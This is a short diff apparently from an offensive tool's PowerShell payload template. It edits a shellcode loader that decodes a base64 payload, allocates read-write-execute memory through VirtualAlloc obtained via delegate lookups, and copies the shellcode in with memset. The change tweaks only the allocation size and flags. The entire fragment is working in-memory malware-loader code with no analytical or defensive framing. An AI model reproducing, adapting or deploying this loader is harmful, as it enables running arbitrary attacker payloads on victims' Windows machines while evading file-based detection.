@@ -20,7 +20,7 @@ function %{func_get_delegate_type} {
 
 [Byte[]]$%{var_code} = [System.Convert]::FromBase64String("%{b64shellcode}")
 		
-$%{var_buffer} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll VirtualAlloc), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, [math]::max(0x1000, $%{var_code}.Length), 0x40)
+$%{var_buffer} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll VirtualAlloc), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $%{var_code}.Length,0x3000, 0x40)
 $%{var_memset} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} msvcrt.dll memset), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32])))
 
 for ($i=0;$i -le ($%{var_code}.Length-1);$i++) {
